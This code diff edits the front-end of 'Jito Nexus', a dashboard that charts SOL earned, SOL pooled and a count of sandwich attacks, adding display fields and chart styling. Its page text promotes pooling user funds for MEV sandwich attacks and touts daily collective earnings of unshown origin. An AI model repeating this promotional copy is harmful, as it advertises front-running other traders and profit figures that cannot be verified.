@@ -73,6 +73,8 @@ function updateTodayStats() {
     console.log("Updating stats, current balance:", currentBalance.toFixed(2));
 
     document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL Gained`;
+    document.getElementById("pooled-sol").textContent = `${pooledSol.toFixed(2)} SOL Pooled`;
+    document.getElementById("sandwich-attacks").textContent = `${sandwichAttacks} Sandwich Attacks`;
     document.getElementById("stats-description").textContent = 
         `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
     updateStatsGraph();
@@ -214,6 +216,7 @@ function initializeStatsGraph() {
         },
         options: {
             responsive: true,
+            maintainAspectRatio: false,
             animation: {
                 duration: 0
             },
@@ -227,7 +230,10 @@ function initializeStatsGraph() {
                         }
                     },
                     ticks: {
-                        color: 'rgba(255, 255, 255, 0.7)'
+                        color: 'rgba(255, 255, 255, 0.7)',
+                        maxRotation: 0,
+                        autoSkip: true,
+                        maxTicksLimit: 5
                     },
                     grid: {
                         color: 'rgba(255, 255, 255, 0.1)'
@@ -247,8 +253,14 @@ function initializeStatsGraph() {
                 legend: {
                     display: true,
                     labels: {
-                        color: 'rgba(255, 255, 255, 0.7)'
+                        color: 'rgba(255, 255, 255, 0.7)',
+                        boxWidth: 12,
+                        padding: 10
                     }
+                },
+                tooltip: {
+                    mode: 'index',
+                    intersect: false
                 }
             }
         }
@@ -278,6 +290,9 @@ function updateStatsGraph() {
 function explainChartLines() {
     const explanation = document.createElement('div');
     explanation.innerHTML = `
+        <p id="sol-balance" style="color: rgba(0, 255, 255, 1); font-size: 18px; font-weight: bold; margin-top: 10px;"></p>
+        <p id="pooled-sol" style="color: rgba(255, 0, 0, 1); font-size: 18px; font-weight: bold; margin-top: 5px;"></p>
+        <p id="sandwich-attacks" style="color: rgba(0, 255, 0, 1); font-size: 18px; font-weight: bold; margin-top: 5px;"></p>
         <p style="color: rgba(0, 255, 255, 0.7); font-size: 14px; margin-top: 10px;">The blue line represents the SOL gained by all users collectively.</p>
         <p style="color: rgba(255, 0, 0, 0.7); font-size: 14px; margin-top: 5px;">The red line represents the SOL pooled by all users together to perform MEV attacks. This pool fluctuates as users contribute and withdraw funds, and as MEV opportunities are exploited.</p>
         <p style="color: rgba(0, 255, 0, 0.7); font-size: 14px; margin-top: 5px;">The green line represents the number of successful sandwich attacks performed.</p>
